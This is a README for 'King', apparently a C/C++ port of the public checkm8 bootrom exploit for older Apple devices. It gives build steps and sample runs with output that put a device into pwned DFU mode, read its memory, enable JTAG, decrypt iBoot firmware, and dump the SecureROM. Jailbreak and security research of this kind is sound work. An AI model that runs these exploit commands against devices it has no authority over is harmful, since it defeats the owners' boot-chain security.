# King

Port of [@axi0mX's](https://twitter.com/axi0mx) checkm8 exploit ([ipwndfu](https://github.com/axi0mX/ipwndfu)) to C/C++

**Supported devices:**

* `T7000`
  * `Apple TV (4th generation)`
  * `HomePod`
  * `iPad mini 4`
  * `iPhone 6`
  * `iPhone 6 Plus`
  * `iPod touch (6th generation)`
* `S8000` and `S8003`
  * `iPad (5th generation)`
  * `iPhone 6s`
  * `iPhone 6s Plus`
  * `iPhone SE`
* `T8010`
  * `iPad (6th generation)`
  * `iPhone 7`
  * `iPhone 7 Plus`

**Works on:**

 * `Windows` (see notes below)
 * `Linux` (tested on `Ubuntu 16.04` and `Ubuntu 19.10`)
 * `MacOS` (cmake-building not working now, do it yourself)


## Windows notes

Requimpents:

* `libusbK` driver (can be installed with [zadig](https://zadig.akeo.ie/))
* `libusb` with fixed `MAX_PATH_LENGTH` ([see this PR](https://github.com/libusb/libusb/pull/699))

## Compilation

```bash
cd King
mkdir build
cd build
cmake ..
make
cp -R ../bin .
```

## Run checkm8 exploit
```
sudo ./king checkm8
[*] Shellcode generated ...
[*] Device Serial Number: CPID:8010 ... SRTG:[iBoot-2696.0.0.1.33]
[*] stage 1, heap grooming ...
[*] stage 2, usb setup, send 0x800 of 'A', sends no data
[*] Device Serial Number: CPID:8010 ... SRTG:[iBoot-2696.0.0.1.33]
[*] stage 3, exploit
[*] Device Serial Number: CPID:8010 ... SRTG:[iBoot-2696.0.0.1.33]
[*] Device Serial Number: CPID:8010 ... SRTG:[iBoot-2696.0.0.1.33] PWND:[checkm8]
[!] Device is now in pwned DFU Mode! :D
```

## Read memory
```
sudo ./king read64 0x100000280
[*] Device Serial Number: CPID:8010 ... SRTG:[iBoot-2696.0.0.1.33] PWND:[checkm8]
[*] [100000280] = 36322D746F6F4269
```

```
sudo ./king read32 0x100000280
[*] Device Serial Number: CPID:8010 CPRV:11 ... SRTG:[iBoot-2696.0.0.1.33] PWND:[checkm8]
[*] [100000280] = 6F6F4269
```

## Demote device (Enable JTAG)
```
[*] Device Serial Number: CPID:8010 ... SRTG:[iBoot-2696.0.0.1.33] PWND:[checkm8]
[*] DemotionReg: 287
[*] Setting Value...
[*] New DemotionReg: 286
[!] Succeeded to enable the JTAG!
```

## Decrypt and unpack IM4P firmware image
```
sudo ./king decryptIMG iBoot.d10.RELEASE.im4p   
decryptIMG4
IM4P: ---------
type: ibot
desc: iBoot-5540.0.129
size: 0x00072340

KBAG
num: 1
3c8b957e2bca7ce6e56b41f86490f535
9fde3e44de15dac204f895378d0e7eb03ecc2b67bb1958bb2c70508ea63875f5
num: 2
af60c224bd43c632a17495816dca1ae6
bada1c3314217e7dd6b903d4c3caf3a7aa0f214ec40f13a1085d04bb2d05dc25

[*] Device Serial Number: CPID:8010 ... SRTG:[iBoot-2696.0.0.1.33] PWND:[checkm8][*] Decrypted Keybag: 
DF97....15CE
[*] Decrypted Key: 
369......5CE
[*] Decrypted IV: 
DF........E7
[!] File succesfully decrypted and written to: iBoot.d10.RELEASE.im4p_decrypted
```

## Hexdump
```
C:\src\King\build>Release\king.exe hexdump 0x100000200 0x90
[*] Device Serial Number: CPID:7000 ... SRTG:[iBoot-1992.0.0.1.19] PWND:[checkm8]
0000000100000200: 53 65 63 75 72 65 52 4f 4d 20 66 6f 72 20 74 37  SecureROM for t7
0000000100000210: 30 30 30 73 69 2c 20 43 6f 70 79 72 69 67 68 74  000si, Copyright
0000000100000220: 20 32 30 31 33 2c 20 41 70 70 6c 65 20 49 6e 63   2013, Apple Inc
0000000100000230: 2e 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
0000000100000240: 52 45 4c 45 41 53 45 00 00 00 00 00 00 00 00 00  RELEASE.........
0000000100000250: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
0000000100000260: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
0000000100000270: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
0000000100000280: 69 42 6f 6f 74 2d 31 39 39 32 2e 30 2e 30 2e 31  iBoot-1992.0.0.1
```

## SecureROM dumping
```
C:\src\King\build>Release\king.exe dump-rom
[*] Device Serial Number: CPID:7000 ... SRTG:[iBoot-1992.0.0.1.19] PWND:[checkm8]
Saved: SecureROM-t7000si-RELEASE-1992.0.0.1.19.dump
```
